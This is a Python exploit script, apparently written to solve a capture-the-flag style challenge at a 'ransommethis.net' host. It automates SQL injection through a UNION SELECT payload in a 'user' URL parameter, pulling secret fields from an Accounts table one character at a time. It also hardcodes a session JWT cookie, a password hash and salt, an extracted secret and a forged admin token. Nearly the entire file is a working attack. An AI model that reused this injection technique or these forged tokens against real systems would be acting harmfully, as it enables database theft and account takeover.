import requests
from bs4 import BeautifulSoup

def main():

    # https://mmlnakapfrknefrq.ransommethis.net/zmjxcobjseapiuyg/userinfo?user=abc%27/**/UNION/**/SELECT/**/uid,uid,uid,uid/**/FROM/**/Accounts/**/WHERE/**/userName=%27PlacidDeveloping
    # String to use
    URL = 'https://mmlnakapfrknefrq.ransommethis.net/zmjxcobjseapiuyg/userinfo?user='
    first = 'abc%27/**/UNION/**/SELECT/**/uid,uid,uid,' 
    second = '/**/FROM/**/Accounts/**/WHERE/**/userName=%27PlacidDeveloping'
    headers = {
        'Cookie': 'tok=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTIxNTY0MzMsImV4cCI6MjA1NDc0ODQzMywic2VjIjoiVmdhbVNyM25sNE1aMXFCNm9PUFJhU0xMR1c4YjM3QmYiLCJ1aWQiOjIxODk1fQ.31JYfeQiR8WbNNN90RwvzofUC9imolRZvx2fhaaqf-4'
    }
    def get_str(field):
        # Getting the secret
        secret = ''
        for i in range(1000):
            to_send = URL + first + 'unicode(substr(' + field + ',' + str(i) + ',1))' + second
            print(f"Iteration {i}: {to_send}")
            r = requests.get(to_send, headers=headers)
            if (r.status_code == 200):
                soup = BeautifulSoup(r.text)
                divs = soup.find_all("div", {"class":"box"})
                for v in divs:
                    if "Contributed" in str(v):
                        num = v.find("p").getText()
                        print(f'Num is: {num}')
                        secret += chr(int(num))
            elif i > 10 and r.status_code != 200:
                break

        print(f"{field} is: {secret}")

    pwhash = 'orNrPuy3yfe9B5jWr5foFJegS7szU2i4aLUOKSv9My9ddhZbp/B5NqsnL/rzUsTR8XsZ9xkaebx6f+H4s6RPrQ=='
    pwsalt = 'd54MFzwGpWalO1G-IA7xUw'
    secret = 'H410nQSBzqgNCvds4J0XiHIuPuV8f03C'
    uid = 38593

    admin_token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTIxNTY0MzMsImV4cCI6MjA1NDc0ODQzMywic2VjIjoiSDQxMG5RU0J6cWdOQ3ZkczRKMFhpSEl1UHVWOGYwM0MiLCJ1aWQiOjM4NTkzfQ.eW8prgbmsZsHjegcczSNO495uN-6x9clWkn7K6-Sya0'

        
if __name__ == '__main__':
    main()
